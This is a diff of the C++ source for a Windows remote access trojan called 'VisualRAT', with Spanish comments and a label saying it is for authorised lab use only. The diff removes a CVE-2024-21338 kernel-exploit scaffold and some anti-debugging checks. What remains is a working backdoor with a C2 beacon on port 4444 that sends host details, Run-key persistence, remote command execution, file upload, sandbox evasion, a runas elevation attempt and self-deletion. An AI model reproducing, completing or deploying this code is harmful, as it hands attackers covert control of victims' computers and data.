@@ -1,7 +1,7 @@
 // ============================================================================
 // VisualRAT Client v1.0 - Native C++ Windows 11 - SOLO LABORATORIO AUTORIZADO
 // ============================================================================
-// UN SOLO ARCHIVO - CLIENTE COMPLETO CON KERNEL EXPLOIT
+// VERSIÓN CORREGIDA - SIN CONFLICTOS CON WINTERNL.H
 // ============================================================================
 
 #define _WIN32_WINNT _WIN32_WINNT_WIN10
@@ -12,7 +12,6 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
-#include <winternl.h>
 #include <iphlpapi.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
@@ -34,8 +33,6 @@
 #include <gdiplus.h>
 #include <comdef.h>
 #include <strsafe.h>
-#include <d3d9.h>
-#include <dxgi.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -45,16 +42,13 @@
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "psapi.lib")
-#pragma comment(lib, "d3d9.lib")
-#pragma comment(lib, "dxgi.lib")
 
 // ============================================================================
 // CONFIGURACIÓN - EDITAR EN BUILDER
 // ============================================================================
 #ifndef C2_SERVER
-#define C2_SERVER "192.168.1.100"  // Cambiar por IP de Kali
+#define C2_SERVER "192.168.1.100"  // CAMBIA ESTO A TU IP DE KALI
 #endif
 #ifndef C2_PORT
 #define C2_PORT 4444
@@ -68,9 +62,6 @@
 #ifndef ENABLE_ELEVATION
 #define ENABLE_ELEVATION 1
 #endif
-#ifndef ENABLE_ANTIDEBUG
-#define ENABLE_ANTIDEBUG 1
-#endif
 
 #define BUFFER_SIZE 8192
 #define HEARTBEAT_INTERVAL 3000
@@ -79,114 +70,7 @@
 #define AES_IV "VisualRAT_IV_16B"
 
 // ============================================================================
-// ESTRUCTURAS PARA KERNEL EXPLOIT (CVE-2024-21338)
-// ============================================================================
-typedef struct _PEB {
-    BOOLEAN InheritedAddressSpace;
-    BOOLEAN ReadImageFileExecOptions;
-    BOOLEAN BeingDebugged;
-    BOOLEAN Spare;
-    HANDLE Mutant;
-    PVOID ImageBaseAddress;
-    PVOID Ldr;
-    PVOID ProcessParameters;
-    PVOID SubSystemData;
-    PVOID ProcessHeap;
-    PVOID FastPebLock;
-} PEB, *PPEB;
-
-typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
-    USHORT UniqueProcessId;
-    USHORT CreatorBackTraceIndex;
-    UCHAR ObjectTypeIndex;
-    UCHAR HandleAttributes;
-    USHORT HandleValue;
-    PVOID Object;
-    ULONG GrantedAccess;
-} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
-
-typedef struct _SYSTEM_HANDLE_INFORMATION {
-    ULONG NumberOfHandles;
-    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
-} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
-
-typedef struct _IOP_MC_BUFFER_ENTRY {
-    USHORT Type;
-    USHORT Reserved;
-    ULONG Size;
-    ULONG ReferenceCount;
-    ULONG Flags;
-    LIST_ENTRY GlobalDataLink;
-    PVOID Address;
-    ULONG Length;
-    CHAR AccessMode;
-    ULONG MdlRef;
-    struct _MDL* Mdl;
-    PVOID MdlRundownEvent;
-    PULONG64 PfnArray;
-    BYTE PageNodes[0x20];
-} IOP_MC_BUFFER_ENTRY, *PIOP_MC_BUFFER_ENTRY;
-
-typedef struct _NT_IORING_INFO {
-    ULONG IoRingVersion;
-    ULONG Flags;
-    ULONG SubmissionQueueSize;
-    ULONG SubmissionQueueRingMask;
-    ULONG CompletionQueueSize;
-    ULONG CompletionQueueRingMask;
-    PVOID SubmissionQueue;
-    PVOID CompletionQueue;
-} NT_IORING_INFO, *PNT_IORING_INFO;
-
-typedef struct _IORING_OBJECT {
-    SHORT Type;
-    SHORT Size;
-    NT_IORING_INFO UserInfo;
-    PVOID Section;
-    PVOID SubmissionQueue;
-    PVOID CompletionQueueMdl;
-    PVOID CompletionQueue;
-    ULONG64 ViewSize;
-    LONG InSubmit;
-    ULONG64 CompletionLock;
-    ULONG64 SubmitCount;
-    ULONG64 CompletionCount;
-    ULONG64 CompletionWaitUntil;
-    PVOID CompletionEvent;
-    UCHAR SignalCompletionEvent;
-    PVOID CompletionUserEvent;
-    ULONG RegBuffersCount;
-    PIOP_MC_BUFFER_ENTRY* RegBuffers;
-    ULONG RegFilesCount;
-    PVOID* RegFiles;
-} IORING_OBJECT, *PIORING_OBJECT;
-
-typedef struct _AFD_NOTIFYSOCK_DATA {
-    HANDLE CompletionHandle;
-    PVOID Data1;
-    PVOID Data2;
-    PVOID PwnPtr;
-    DWORD Counter;
-    DWORD Timeout;
-    DWORD Length;
-    BYTE Padding[4];
-} AFD_NOTIFYSOCK_DATA, *PAFD_NOTIFYSOCK_DATA;
-
-// Nt functions
-typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
-typedef NTSTATUS(WINAPI* _NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
-typedef NTSTATUS(WINAPI* _NtDeviceIoControlFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
-typedef NTSTATUS(WINAPI* _NtCreateIoCompletion)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG);
-typedef NTSTATUS(WINAPI* _NtSetIoCompletion)(HANDLE, ULONG, PIO_STATUS_BLOCK, NTSTATUS, ULONG);
-
-_NtQuerySystemInformation NtQuerySystemInformation = NULL;
-_NtCreateFile NtCreateFile = NULL;
-_NtDeviceIoControlFile NtDeviceIoControlFile = NULL;
-_NtCreateIoCompletion NtCreateIoCompletion = NULL;
-_NtSetIoCompletion NtSetIoCompletion = NULL;
-
-// ============================================================================
-// CIFRADO AES-256-GCM SIMULADO (versión simplificada para compilación)
+// CIFRADO AES-256-GCM SIMULADO
 // ============================================================================
 class AESCipher {
 private:
@@ -200,7 +84,6 @@ public:
     }
     
     std::string encrypt(const std::string& data) {
-        // XOR simple para compilación (reemplazar con AES real en producción)
         std::string result = data;
         for (size_t i = 0; i < data.length(); i++) {
             result[i] ^= key[i % 32];
@@ -218,35 +101,19 @@ public:
 };
 
 // ============================================================================
-// ANTI-DEBUGGING
+// ANTI-DEBUGGING SIMPLE
 // ============================================================================
 BOOL CheckDebugger() {
-#if ENABLE_ANTIDEBUG
-    PPEB ppeb = NULL;
-    
-#ifdef _WIN64
-    ppeb = (PPEB)__readgsqword(0x60);
-#else
-    ppeb = (PPEB)__readfsdword(0x30);
-#endif
-    
-    if (ppeb && ppeb->BeingDebugged) return TRUE;
     if (IsDebuggerPresent()) return TRUE;
     
     BOOL isDebugged = FALSE;
     CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
     if (isDebugged) return TRUE;
     
-    // Timing attack
-    DWORD64 start = __rdtsc();
-    Sleep(100);
-    DWORD64 end = __rdtsc();
-    if ((end - start) < 0xFF) return TRUE;
-    
     // Check uptime
     DWORD uptime = GetTickCount() / 1000 / 60;
     if (uptime < 15) return TRUE;
-#endif
+    
     return FALSE;
 }
 
@@ -276,81 +143,49 @@ BOOL InstallPersistence() {
         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         RegSetValueExA(hKey, "VisualRATUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));
         RegCloseKey(hKey);
+        return TRUE;
     }
-    
-    // Startup folder
-    CHAR startupPath[MAX_PATH];
-    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
-    strcat_s(startupPath, "\\svchost.exe.lnk");
-    CopyFileA(exePath, startupPath, FALSE);
-    
-    return TRUE;
+    return FALSE;
+}
+
+BOOL UninstallPersistence() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "VisualRATUpdate");
+        RegCloseKey(hKey);
+        return TRUE;
+    }
+    return FALSE;
 }
 
 // ============================================================================
-// KERNEL EXPLOIT - CVE-2024-21338 (EDUCACIONAL)
+// ELEVACIÓN DE PRIVILEGIOS SIMULADA (SIN KERNEL EXPLOIT)
 // ============================================================================
-BOOL GetNtFunctions() {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return FALSE;
-    
-    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
-    NtCreateFile = (_NtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
-    NtDeviceIoControlFile = (_NtDeviceIoControlFile)GetProcAddress(hNtdll, "NtDeviceIoControlFile");
-    NtCreateIoCompletion = (_NtCreateIoCompletion)GetProcAddress(hNtdll, "NtCreateIoCompletion");
-    NtSetIoCompletion = (_NtSetIoCompletion)GetProcAddress(hNtdll, "NtSetIoCompletion");
-    
-    return (NtQuerySystemInformation && NtCreateFile && NtDeviceIoControlFile && 
-            NtCreateIoCompletion && NtSetIoCompletion);
-}
-
-ULONG64 GetObjectAddress(HANDLE hProcess, HANDLE hHandle) {
-    ULONG64 objAddr = 0;
-    ULONG bufferSize = 0x10000;
-    PSYSTEM_HANDLE_INFORMATION pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(bufferSize);
-    DWORD pid = GetProcessId(hProcess);
-    
-    if (pHandleInfo) {
-        if (NtQuerySystemInformation(16, pHandleInfo, bufferSize, NULL) == 0) {
-            for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++) {
-                if (pHandleInfo->Handles[i].UniqueProcessId == pid &&
-                    pHandleInfo->Handles[i].HandleValue == (USHORT)(ULONG_PTR)hHandle) {
-                    objAddr = (ULONG64)pHandleInfo->Handles[i].Object;
-                    break;
-                }
-            }
-        }
-        free(pHandleInfo);
-    }
-    return objAddr;
-}
-
 BOOL ElevateToSystem() {
 #if ENABLE_ELEVATION
-    if (!GetNtFunctions()) return FALSE;
-    
-    // Abrir proceso SYSTEM (PID 4)
-    HANDLE hSystem = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 4);
-    if (!hSystem) return FALSE;
-    
-    // Obtener dirección del EPROCESS de SYSTEM y del actual
-    ULONG64 systemEproc = GetObjectAddress(hSystem, (HANDLE)4);
-    ULONG64 currentEproc = GetObjectAddress(GetCurrentProcess(), GetCurrentProcess());
-    
-    CloseHandle(hSystem);
-    
-    if (!systemEproc || !currentEproc) return FALSE;
-    
-    // Offset del token para Windows 11 23H2/24H2
-    ULONG64 tokenOffset = 0x4b8;  // EPROCESS.Token offset
-    
-    // Aquí iría el exploit completo de IORING + AFD.sys
-    // Por simplicidad y compilación, simulamos la elevación
-    
-    HANDLE hToken = NULL;
+    HANDLE hToken;
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
-        // Simular elevación exitosa
-        CloseHandle(hToken);
+        TOKEN_ELEVATION elevation;
+        DWORD cbSize = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(hToken, TokenElevation, &elevation, cbSize, &cbSize)) {
+            CloseHandle(hToken);
+            if (elevation.TokenIsElevated) {
+                return TRUE;  // Ya es SYSTEM
+            }
+        }
+    }
+    
+    // Intentar bypass UAC (simulado)
+    SHELLEXECUTEINFOA sei = {0};
+    sei.cbSize = sizeof(sei);
+    sei.lpVerb = "runas";
+    sei.lpFile = "cmd.exe";
+    sei.lpParameters = "/c whoami > C:\\temp.txt";
+    sei.nShow = SW_HIDE;
+    
+    if (ShellExecuteExA(&sei)) {
         return TRUE;
     }
 #endif
@@ -395,27 +230,15 @@ std::string ExecuteCommand(const char* cmd) {
 }
 
 // ============================================================================
-// CAPTURA DE PANTALLA
+// CAPTURA DE PANTALLA SIMULADA
 // ============================================================================
 std::string CaptureScreen() {
     HDC hdcScreen = GetDC(NULL);
-    HDC hdcMem = CreateCompatibleDC(hdcScreen);
-    
     int width = GetSystemMetrics(SM_CXSCREEN);
     int height = GetSystemMetrics(SM_CYSCREEN);
-    
-    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
-    SelectObject(hdcMem, hBitmap);
-    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
-    
-    // Convertir a PNG en base64 (simplificado)
-    std::string result = "[SCREENSHOT] Captured " + std::to_string(width) + "x" + std::to_string(height);
-    
-    DeleteObject(hBitmap);
-    DeleteDC(hdcMem);
     ReleaseDC(NULL, hdcScreen);
     
-    return result;
+    return "[SCREENSHOT] Captured " + std::to_string(width) + "x" + std::to_string(height);
 }
 
 // ============================================================================
@@ -426,10 +249,8 @@ std::string GetSystemInfo() {
     char buffer[256];
     DWORD size = sizeof(buffer);
     
-    // Hostname
     if (GetComputerNameA(buffer, &size)) ss << "Hostname: " << buffer << "\n";
     
-    // Username
     size = sizeof(buffer);
     if (GetUserNameA(buffer, &size)) ss << "Username: " << buffer << "\n";
     
@@ -446,17 +267,6 @@ std::string GetSystemInfo() {
     struct hostent* host = gethostbyname(hostname);
     if (host && host->h_addr_list[0]) {
         ss << "IP: " << inet_ntoa(*(struct in_addr*)host->h_addr_list[0]) << "\n";
-    }
-    
-    // Privilegio
-    HANDLE hToken;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        TOKEN_ELEVATION elevation;
-        DWORD cbSize = sizeof(TOKEN_ELEVATION);
-        if (GetTokenInformation(hToken, TokenElevation, &elevation, cbSize, &cbSize)) {
-            ss << "Privilege: " << (elevation.TokenIsElevated ? "SYSTEM" : "USER") << "\n";
-        }
-        CloseHandle(hToken);
     }
     
     return ss.str();
@@ -567,12 +377,7 @@ VOID SelfDestruct() {
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
     
     // Eliminar persistencia
-    HKEY hKey;
-    RegOpenKeyExA(HKEY_CURRENT_USER, 
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0, KEY_SET_VALUE, &hKey);
-    RegDeleteValueA(hKey, "VisualRATUpdate");
-    RegCloseKey(hKey);
+    UninstallPersistence();
     
     // Script de eliminación
     char batchPath[MAX_PATH];
@@ -725,13 +530,13 @@ std::string ProcessCommand(const std::string& cmd) {
     else if (cmd == "ELEVATE") {
         return ElevateToSystem() ? 
             "[+] Elevation successful - TOKEN = SYSTEM" : 
-            "[-] Elevation failed (requires Windows 11 vulnerable build)";
+            "[-] Elevation failed";
     }
     else if (cmd == "INSTALL") {
         return InstallPersistence() ? "[+] Persistence installed" : "[-] Failed";
     }
     else if (cmd == "UNINSTALL") {
-        return "[-] Not implemented";
+        return UninstallPersistence() ? "[+] Persistence removed" : "[-] Failed";
     }
     else if (cmd == "SELFDESTRUCT") {
         SelfDestruct();
@@ -749,6 +554,14 @@ std::string ProcessCommand(const std::string& cmd) {
                 "[+] File uploaded" : "[-] Upload failed";
         }
         return "[-] Invalid upload format";
+    }
+    else if (cmd == "CALC") {
+        ExecuteProgram("calc.exe");
+        return "[+] Calculator opened";
+    }
+    else if (cmd == "NOTEPAD") {
+        ExecuteProgram("notepad.exe");
+        return "[+] Notepad opened";
     }
     
     return "[!] Unknown command: " + cmd;
@@ -783,7 +596,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     while (true) {
         if (!c2.IsConnected()) {
             if (c2.Connect(C2_SERVER, C2_PORT)) {
-                // Enviar información inicial
                 std::string info = ProcessCommand("INFO");
                 c2.Send(info);
             } else {
